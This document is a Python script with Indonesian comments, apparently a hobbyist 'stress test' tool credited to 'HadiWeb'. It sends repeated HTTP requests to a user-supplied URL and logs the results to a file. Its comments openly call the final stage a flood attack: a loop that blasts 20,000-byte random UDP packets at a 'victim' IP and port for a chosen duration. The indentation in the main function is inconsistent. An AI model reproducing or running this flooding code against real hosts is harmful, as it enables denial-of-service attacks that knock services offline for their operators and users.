import requests
import time
import random
import signal
import socket
from colorama import Fore, Style
import os

# Fungsi untuk menangani sinyal SIGTSTP (Ctrl+Z)
def signal_handler(sig, frame):
    print('\nProses request dihentikan.')
    exit(0)

# Mengatur penanganan sinyal SIGTSTP (Ctrl+Z)
signal.signal(signal.SIGTSTP, signal_handler)

# Fungsi untuk mengirim request ke server
def send_request(url, num_requests, max_delay):
    # Mengatur adapter HTTP
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=100,
        pool_maxsize=100,
        max_retries=3,
    )

    # Membuat session dengan adapter HTTP
    session = requests.Session()
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # Melakukan request sebanyak jumlah yang diinginkan
    responses = []
    for i in range(num_requests):
        # Menampilkan progress request
        print(f"Mengirim request ke server... {i+1}/{num_requests}", end='\r')

        # Memulai waktu sebelum request
        start_time = time.time()

        # Melakukan request
        response = session.get(url)

        # Menghitung waktu respons dari server
        response_time = (time.time() - start_time) * 1000

        # Menyimpan respons ke dalam list
        responses.append(response)

        # Menampilkan status code, waktu respons dari server, dan status kesehatan situs
        if response.status_code == 200:
            print(f"Response {i+1}: {response.status_code} | Response Time: {response_time:.2f} ms | Status: Healthy")
        else:
            print(f"Response {i+1}: {response.status_code} | Response Time: {response_time:.2f} ms | Status: Down")

        # Menghasilkan delay acak antara 0 hingga max_delay
        delay = random.uniform(0, max_delay)

        # Memberikan penundaan sebelum request berikutnya
        time.sleep(delay)

    return responses

# Fungsi untuk melakukan serangan flood menggunakan UDP
def flood(victim, vport, duration):
    # Membuat socket dengan tipe SOCK_DGRAM untuk UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Menyiapkan bytes random sebagai payload
    bytes = random._urandom(20000)
    timeout = time.time() + duration
    sent = 3000

    while True:
        if time.time() > timeout:
            break
        else:
            pass
        # Mengirim paket ke target
        client.sendto(bytes, (victim, vport))
        sent += 1
        print(f"Memulai {sent} mengirim paket {victim} pada port {vport}")

def main():
  
  # Membersihkan layar
  os.system('cls' if os.name == 'nt' else 'clear')
  
  # Mengatur warna banner
  banner_color = Fore.CYAN
  banner_color2 = Fore.GREEN
  banner_color3 = Fore.RED
  
    # Banner ReQTest
  print(banner_color + """
    ██████╗ ███████╗███████╗████████╗ █████╗ ███╗   ██╗ ██████╗ ██████╗ 
    ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗████╗  ██║██╔════╝██╔═══██╗
    ██████╔╝█████╗  ███████╗   ██║   ███████║██╔██╗ ██║██║     ██║   ██║
    ██╔══██╗██╔══╝  ╚════██║   ██║   ██╔══██║██║╚██╗██║██║     ██║   ██║
    ██║  ██║███████╗███████║   ██║   ██║  ██║██║ ╚████║╚██████╗╚██████╔╝
    ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ 
     by HadiWeb
  """)

    # Input URL target
    url = input(banner_color2 + "Masukkan URL target: ")

    # Input jumlah request yang diinginkan
    num_requests = int(input(banner_color2 + "Masukkan jumlah request: "))

    # Input max delay (dalam detik)
    max_delay = float(input(banner_color2 + "Masukkan max delay (dalam detik): "))

    # Input victim
    victim = input(banner_color2 + "Masukkan alamat IP victim: ")

    # Input port
    port = int(input(banner_color2 + "Masukkan port target: "))

    # Input duration
    duration = int(input(banner_color2 + "Masukkan durasi serangan flood (dalam detik): "))

    # Mengirim request ke server
    responses = send_request(url, num_requests, max_delay)

    # Hapus file hasil.txt jika sudah ada sebelumnya
    if os.path.exists('hasil.txt'):
        os.remove('hasil.txt')

    # Membuat file hasil.txt
    with open('hasil.txt', 'w') as file:
        # Menulis informasi victim, waktu respons server, dan status kesehatan situs
        file.write(f"URL: {url}\n\n")
        file.write(f"Victim: {victim}\n\n")
        for i, response in enumerate(responses):
            file.write(f"Request {i+1}:\n")
            file.write(f"Status Code: {response.status_code}\n")
            file.write(f"Response Time: {(response.elapsed.total_seconds() * 1000):.2f} ms\n")
            if response.status_code == 200:
                file.write("Status: Healthy\n")
            else:
                file.write("Status: Down\n")
            file.write("\n")

    # Melakukan serangan flood
    flood(victim, port, duration)

if __name__ == '__main__':
    main()
